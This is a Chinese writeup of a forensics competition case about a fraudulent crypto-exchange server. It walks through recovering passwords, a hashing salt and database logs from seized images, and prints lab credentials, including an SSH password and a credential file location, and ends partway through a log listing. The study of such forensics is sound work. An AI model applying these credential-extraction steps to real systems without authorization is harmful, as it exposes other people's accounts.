---
title: 第四届长安杯电子数据取证大赛Writeup
icon: award
order: 1
sidebar: structure
pageview: true
---

## 案件情况

某地警方接到受害人报案称其在某虚拟币交易网站遭遇诈骗，该网站号称使用“USTD 币”购买所谓的“HT 币”，受害人充 值后不但“HT 币”无法提现、交易，而且手机还被恶意软件锁定 勒索。警方根据受害人提供的虚拟币交易网站调取了对应的服 务器镜像并对案件展开侦查。

## 检材地址

链接: https://pan.baidu.com/s/1JWxtyhzmjZksAos2QUaWcw?pwd=wvk4  

提取码: wvk4 

VeraCrypt密码：2022.4th.changancup!

VeraCrypt使用参考：[Forensics-Wiki](https://www.forensics-wiki.com)

## 检材1

根据报案人提供的网站域名和IP，警方调取了对应的服务器镜像“检材1”，分析掌握的检材回答下列问题

### 1. 检材1的SHA256值为

直接使用火眼即可得到

![image-20221031203013152](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031203013152.png)

### 2. 分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2

可以在登录日志中查看IP都是为同一个，所以确定为技术员的IP地址即：**172.16.80.100**

![image-20221031203904582](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031203904582.png)

### 3. 检材1中，操作系统发行版本号为

仿真出的镜像中，使用如下命令得出：

```
cat /etc/redhat-release
```

![image-20221031204532795](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031204532795.png)



### 4. 检材1系统中，网卡绑定的静态IP地址为

使用如下命令即可得到

```
ifconfig
```

![image-20221031204920519](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031204920519.png)

### 5. 检材1中，网站jar包所存放的目录是(答案为绝对路径，如“/home/honglian/”)

查看历史命令，发现多次进入`/web/app`目录，并执行npm等指令，进入后发现有多个jar包，确定为网站jar包所存放目录

![image-20221031205135523](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031205135523.png)

### 6. 检材1中，监听7000端口的进程对应文件名为

#### 方法一

将jar包全部导出，逐个分析，查看是哪个jar包使用了7000端口

![image-20221031210228367](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031210228367.png)

在`cloud.jar`中发现使用7000端口

#### 方法二

直接启动网站，查看占用端口情况，但是较难，因为嫌疑人删除了启动脚本，在做检材2时，D盘中会有该网站的启动脚本，将检材2中的脚本复制到检材1中，启动网站即可。

### 7. 检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）

检材2 D盘中的start_web.sh 即启动脚本

![image-20221031213016579](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031213016579.png)

![image-20221031220959669](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031220959669.png)

完全启动后查看端口使用情况

![image-20221031221301002](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031221301002.png)

在进入9090的时候发现为网站的后台

![image-20221031221330898](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031221330898.png)

### 8. 检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“https://www.forensix.cn/abc/def”)

依上题，查看3000端口后发现为网站前端，找到APP下载地址，扫描即可得到答案

![image-20221031221525710](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031221525710.png)

![image-20221031221709834](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031221709834.png)

### 9. 检材1中，网站管理后台页面调用的用户表(admin)里的密码字段加密方式为?

#### 方法一

快进到检材3部分，找到数据库中的admin表，发现密码为32位，判断为md5

#### 方法二

反编译admin-api.jar包，在最后发现md5.key，判断为md5

#### 方法三

通过搜索md5，发现对md5的调用

![image-20221031222612209](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031222612209.png)

#### 方法四

通过随机登录查看发送的内容

```
http://172.16.80.133:6010/admin/system/employee/googleAuth/sign/in
```

![image-20221031222810213](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031222810213.png)

其中的`/sign/in`在admin-api.jar包中也出现了，同时后面的账号验证机制也使用到了md5key

![image-20221031233006229](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031233006229.png)

#### 10. 分析检材1，网站管理后台登录密码加密算法中所使用的盐值是

在分析admin-api.jar包时，即可得到盐值

```java
# system
bdtop.system.md5.key=XehGyeyrVgOV4P8Uf70REVpIw3iVNwNs
coin.not.sync=ETH
google.auth.url=ztuo.fcoincn.com
bdtop.system.work-id=1
bdtop.system.data-center-id=1
```

## 检材二

根据IP地址落地及后续侦查，抓获了搭建网站的技术员，扣押了其个人电脑并制作镜像“检材2”，分析所有掌握的检材回答下列问题

由第二题答案解压得到检材二

### 11. 检材2中，windows账户Web King的登录密码

通过火眼分析即可得到

![image-20221031234044249](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031234044249.png)

### 12. 检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3

由第四题已知检材1的IP是：172.16.80.133

所以在分析结果中排除172.16.80.133，另一个IP即是答案

![image-20221031234223097](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031234223097.png)

### 13. 检材2中，powershell中输入的最后一条命令是

此处有一个误区，很多人可能以为火眼分析出的系统SSH里就是答案，但其实根据后面知道嫌疑人安装了WSL，所以该系统SSH历史输入命令其实是WSL的的历史命令。

而Windows中的Powershell位置是`%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

![image-20221031234531861](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031234531861.png)

### 14. 检材2中，下载的涉案网站源代码文件名为

将镜像仿真起来，发现在`下载`中有多个zip

![image-20221031235008404](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031235008404.png)

通过在github搜索[ZTuoExchange_framework](https://github.com/sengeiou/ZTuoExchange_framework)发现符合本次比赛的案情。

### 15. 检材2中，网站管理后台root账号的密码为

在解析出的Google浏览器中直接发现了保存的密码

![image-20221101000122797](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101000122797.png)

### 16. 检材2中，技术员使用的WSL子系统发行版本是

#### 方法一

首先在开始菜单中，发现两个子系统

![image-20221101000312555](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101000312555.png)

但是题目要的是技术员使用的，就说明是有其他数据的

通过搜索得知WSL的位置是：`C:\Users\Web King\AppData\Local\Packages`，在目录下找到这两个的文件

![image-20221101000454314](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101000454314.png)

通过对比两个文件大小，发现20.04的版本明显大于22.04的，所以确定20.04是技术员试用的子系统

![image-20221101000636930](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101000636930.png)

#### 方法二

通过在仿真的镜像中启动子系统，发现20.04是可以直接进入命令行的，而22.04是需要进行配置的

#### 方法三

使用指令得到

```
wsl -l -v
```

![image-20221101001052352](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101001052352.png)

### 17. 检材2中，运行的数据库服务版本号是

在启动mysql后，使用命令直接得到

![image-20221101002019150](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101002019150.png)

### 18. 上述数据库debian-sys-maint用户的初始密码是

通过搜索得知debian-sys-maint用户的初始密码位于/etc/mysql/debian.cnf中

![image-20221101002205932](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101002205932.png)

### 19. 检材3服务器root账号的密码是

在检材2的系统SSH历史输入命令中，发现曾使用sshpass对172.16.80.128进行连接，连接密码为`h123456`

![image-20221101002342400](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101002342400.png)

## 检材三

根据网站前端和技术员个人电脑上的线索，发现了网站后端所在的服务器IP并再次调证取得“检材3”，分析所有掌握的检材回答下列问题

通过第12题答案，解压检材3

### 20. 检材3中，监听33050端口的程序名（program name)为

在历史命令中发现嫌疑人进入了/data/mysql 之后使用了docker-compose up

进入目录后，查看docker-compose.yml配置文件，发现使用了33050，尝试启动后发现program name

![image-20221101120302903](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101120302903.png)

![image-20221101120543991](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101120543991.png)

### 21. 除MySQL外，该网站还依赖以下哪种数据库

在分析检材一时，对于admin-api.jar的分析中，发现他使用了redis以及mongo

![image-20221101120831194](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101120831194.png)

### 22.  检材3中，MySQL数据库root账号的密码是

#### 方法一

同样在admin-api.jar中也可分析出密码

![image-20221101121005822](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101121005822.png)

#### 方法二

在docker-compose配置文件中也能找到

![image-20221101121231075](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101121231075.png)

### 23. 检材3中，MySQL数据库在容器内部的数据目录为

#### 方法一

通过对docker-compose.yml的分析，可以看到它是将`/data/mysql/db`目录，挂载到了容器的`/var/lib/mysql`中，所以`/var/lib/mysql`就是他的数据目录

![image-20221101121352048](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101121352048.png)

#### 方法二

通过进入容器内部找到相关信息

```dockerfile
docker exec -it 8eda4cb0b452 bash
```

![image-20221101121705555](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101121705555.png)

### 24. 涉案网站调用的MySQL数据库名为

通过对于admin-api.jar包的分析，发现他连接的数据库名是b1

![image-20221101121918839](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101121918839.png)

### 25. 勒索者在数据库中修改了多少个用户的手机号？

首先在`/data/mysql/db`发现了`8eda4cb0b452.log`该文件。发现里面记录了创建表等日志

通过搜索`UPDATE`发现他修改了`b1`数据库的`member表`中的`mobile_phone`,计数找到`8次`分别是

```mysql
2022-10-18T08:48:06.120268Z	    8 Query	update admin set last_login_time='2022-10-18 04:48:06.114', last_login_ip=null where id=1
2022-10-18T08:48:21.016425Z	    8 Query	update admin set last_login_time='2022-10-18 04:48:21.023', last_login_ip='172.16.80.100' where id=1
2022-10-18T09:38:56.117223Z	    9 Query	update admin set last_login_time='2022-10-18 05:38:56.113', last_login_ip='172.16.80.197' where id=1
2022-10-19T03:20:39.001499Z	   13 Query	UPDATE `b1`.`member` SET `mobile_phone` = '13638991111' WHERE `id` = 9
2022-10-19T03:20:41.851525Z	   13 Query	UPDATE `b1`.`member` SET `mobile_phone` = '13282992222' WHERE `id` = 10
2022-10-19T03:20:44.184953Z	   13 Query	UPDATE `b1`.`member` SET `mobile_phone` = '13636993333' WHERE `id` = 11
2022-10-19T05:34:00.075764Z	   10 Query	select count(a.id) from member a , member_application b where a.id = b.member_id and b.audit_status = 2 and date_format(b.update_time,'%Y-%m-%d') = '2022-10-18'
2022-10-20T03:18:25.478485Z	   10 Query	update admin set last_login_time='2022-10-19 23:18:25.461', last_login_ip='172.16.80.100' where id=1
```

但是发现这8次中，有5次都是关于登录信息的，所以排除，因此只有`3个`

### 26.  勒索者在数据库中删除的用户数量为

在该日志中搜索`DELETE`发现他删除了`b1`数据库的`member表`的内容，从973一直删到了1000，所以删除了28个用户

![image-20221101123732257](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101123732257.png)

### 27. 还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压 检材4

#### 方法一 直接恢复数据库连接分析

首先还原被破坏的数据库，b1数据库在检材三中被删除了，因为需要将检材二中的b1放进去，然后启动mysql

![image-20221101124621763](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101124621763.png)

之后连接数据库，在admin表中发现了登录的历史IP

![image-20221101125006270](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101125006270.png)

#### 方法二 使用火眼数据库分析工具分析b1数据库

![image-20221101125100662](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101125100662.png)

### 28. 还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为

在`member_wallet表`中，找到ID=500的用户，直接可以得到

> cee631121c2ec9232f3a2f028ad5c89b

![image-20221101130236339](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101130236339.png)

### 29. 还原全部被删改数据，共有多少名用户的会员等级为'LV3'

`member`表中会找到答案，member_grade_id`为3的情况下数据库中有158个

![image-20221101131643580](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101131643580.png)

然而并未考虑被删除的用户中LV=3的用户数量

被删除的用户如下：

```mysql
2022-10-19T03:16:36.987428Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 973
2022-10-19T03:16:37.011565Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 974
2022-10-19T03:16:37.018915Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 975
2022-10-19T03:16:37.024719Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 976
2022-10-19T03:16:37.030514Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 977
2022-10-19T03:16:37.036525Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 978
2022-10-19T03:16:37.043063Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 979
2022-10-19T03:16:37.050115Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 980
2022-10-19T03:16:37.058208Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 981
2022-10-19T03:16:37.063910Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 982
2022-10-19T03:16:37.069479Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 983
2022-10-19T03:16:37.075433Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 984
2022-10-19T03:16:37.081648Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 985
2022-10-19T03:16:37.090573Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 986
2022-10-19T03:16:37.097442Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 987
2022-10-19T03:16:37.109309Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 988
2022-10-19T03:16:37.116375Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 989
2022-10-19T03:16:37.122000Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 990
2022-10-19T03:16:37.128186Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 991
2022-10-19T03:16:37.134416Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 992
2022-10-19T03:16:37.141373Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 993
2022-10-19T03:16:37.147063Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 994
2022-10-19T03:16:37.153631Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 995
2022-10-19T03:16:37.161562Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 996
2022-10-19T03:16:37.168149Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 997
2022-10-19T03:16:37.175782Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 998
2022-10-19T03:16:37.183277Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 999
2022-10-19T03:16:37.191203Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 1000
```

逻辑：需要在日志中找到被删除的原数据，然后找到member_guild_id=3的用户数量，再加上158

```MYSQL
2022-10-19T03:12:07.961675Z	   12 Query	INSERT INTO `member` VALUES (973, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13532680973', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo973', 1, NULL, 0, '2022-10-18 13:4:24', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1973', '2022-10-18 13:4:24', 1, NULL, 0, '13532680973', NULL, NULL, '中国', 0, 3, 0, 0, NULL)
2022-10-19T03:12:07.968287Z	   12 Query	INSERT INTO `member` VALUES (974, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13176680974', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo974', 1, NULL, 0, '2022-10-18 14:14:4', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1974', '2022-10-18 14:14:4', 1, NULL, 0, '13176680974', NULL, NULL, '中国', 0, 5, 0, 0, NULL)
2022-10-19T03:12:07.974085Z	   12 Query	INSERT INTO `member` VALUES (975, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13530690975', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo975', 1, NULL, 0, '2022-10-18 15:23:44', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1975', '2022-10-18 15:23:44', 1, NULL, 0, '13530690975', NULL, NULL, '中国', 0, 3, 0, 0, NULL)
2022-10-19T03:12:07.979831Z	   12 Query	INSERT INTO `member` VALUES (976, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13942370976', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo976', 1, NULL, 0, '2022-10-18 16:33:24', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1976', '2022-10-18 16:33:24', 1, NULL, 0, '13942370976', NULL, NULL, '中国', 0, 1, 0, 0, NULL)
2022-10-19T03:12:07.985614Z	   12 Query	INSERT INTO `member` VALUES (977, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13486370977', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo977', 1, NULL, 0, '2022-10-18 13:4:43', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1977', '2022-10-18 13:4:43', 1, NULL, 0, '13486370977', NULL, NULL, '中国', 0, 5, 0, 0, NULL)
2022-10-19T03:12:07.991726Z	   12 Query	INSERT INTO `member` VALUES (978, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13840370978', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo978', 1, NULL, 0, '2022-10-18 14:14:23', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1978', '2022-10-18 14:14:23', 1, NULL, 0, '13840370978', NULL, NULL, '中国', 0, 3, 0, 0, NULL)
2022-10-19T03:12:07.996485Z	   12 Query	INSERT INTO `member` VALUES (979, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13384370979', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo979', 1, NULL, 0, '2022-10-18 15:24:3', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1979', '2022-10-18 15:24:3', 1, NULL, 0, '13384370979', NULL, NULL, '中国', 0, 1, 0, 0, NULL)
2022-10-19T03:12:08.002778Z	   12 Query	INSERT INTO `member` VALUES (980, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13738370980', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo980', 1, NULL, 0, '2022-10-18 16:33:43', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1980', '2022-10-18 16:33:43', 1, NULL, 0, '13738370980', NULL, NULL, '中国', 0, 5, 0, 0, NULL)
2022-10-19T03:12:08.008331Z	   12 Query	INSERT INTO `member` VALUES (981, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13282380981', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo981', 1, NULL, 0, '2022-10-18 13:15:36', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1981', '2022-10-18 13:15:36', 1, NULL, 0, '13282380981', NULL, NULL, '中国', 0, 3, 0, 0, NULL)
2022-10-19T03:12:08.013494Z	   12 Query	INSERT INTO `member` VALUES (982, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13736380982', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo982', 1, NULL, 0, '2022-10-18 14:25:16', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1982', '2022-10-18 14:25:16', 1, NULL, 0, '13736380982', NULL, NULL, '中国', 0, 5, 0, 0, NULL)
2022-10-19T03:12:08.019163Z	   12 Query	INSERT INTO `member` VALUES (983, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13248060983', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo983', 1, NULL, 0, '2022-10-18 15:34:56', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1983', '2022-10-18 15:34:56', 1, NULL, 0, '13248060983', NULL, NULL, '中国', 0, 3, 0, 0, NULL)
2022-10-19T03:12:08.023970Z	   12 Query	INSERT INTO `member` VALUES (984, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13692060984', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo984', 1, NULL, 0, '2022-10-18 16:44:36', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1984', '2022-10-18 16:44:36', 1, NULL, 0, '13692060984', NULL, NULL, '中国', 0, 1, 0, 0, NULL)
2022-10-19T03:12:08.030725Z	   12 Query	INSERT INTO `member` VALUES (985, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13146060985', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo985', 1, NULL, 0, '2022-10-18 13:15:55', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1985', '2022-10-18 13:15:55', 1, NULL, 0, '13146060985', NULL, NULL, '中国', 0, 5, 0, 0, NULL)
2022-10-19T03:12:08.035551Z	   12 Query	INSERT INTO `member` VALUES (986, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13590070986', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo986', 1, NULL, 0, '2022-10-18 14:25:34', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1986', '2022-10-18 14:25:34', 1, NULL, 0, '13590070986', NULL, NULL, '中国', 0, 3, 0, 0, NULL)
2022-10-19T03:12:08.040445Z	   12 Query	INSERT INTO `member` VALUES (987, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13844070987', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo987', 1, NULL, 0, '2022-10-18 15:35:14', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1987', '2022-10-18 15:35:14', 1, NULL, 0, '13844070987', NULL, NULL, '中国', 0, 6, 0, 0, NULL)
2022-10-19T03:12:08.048228Z	   12 Query	INSERT INTO `member` VALUES (988, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13388070988', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo988', 1, NULL, 0, '2022-10-18 16:44:54', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1988', '2022-10-18 16:44:54', 1, NULL, 0, '13388070988', NULL, NULL, '中国', 0, 4, 0, 0, NULL)
2022-10-19T03:12:08.053610Z	   12 Query	INSERT INTO `member` VALUES (989, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13742070989', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo989', 1, NULL, 0, '2022-10-18 13:26:47', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1989', '2022-10-18 13:26:47', 1, NULL, 0, '13742070989', NULL, NULL, '中国', 0, 2, 0, 0, NULL)
2022-10-19T03:12:08.058670Z	   12 Query	INSERT INTO `member` VALUES (990, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13353750990', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo990', 1, NULL, 0, '2022-10-18 14:36:27', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1990', '2022-10-18 14:36:27', 1, NULL, 0, '13353750990', NULL, NULL, '中国', 0, 4, 0, 0, NULL)
2022-10-19T03:12:08.066046Z	   12 Query	INSERT INTO `member` VALUES (991, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13797750991', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo991', 1, NULL, 0, '2022-10-18 15:46:7', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1991', '2022-10-18 15:46:7', 1, NULL, 0, '13797750991', NULL, NULL, '中国', 0, 2, 0, 0, NULL)
2022-10-19T03:12:08.070986Z	   12 Query	INSERT INTO `member` VALUES (992, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13251760992', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo992', 1, NULL, 0, '2022-10-18 16:55:47', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1992', '2022-10-18 16:55:47', 1, NULL, 0, '13251760992', NULL, NULL, '中国', 0, 6, 0, 0, NULL)
2022-10-19T03:12:08.076234Z	   12 Query	INSERT INTO `member` VALUES (993, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13695760993', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo993', 1, NULL, 0, '2022-10-18 13:27:6', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1993', '2022-10-18 13:27:6', 1, NULL, 0, '13695760993', NULL, NULL, '中国', 0, 4, 0, 0, NULL)
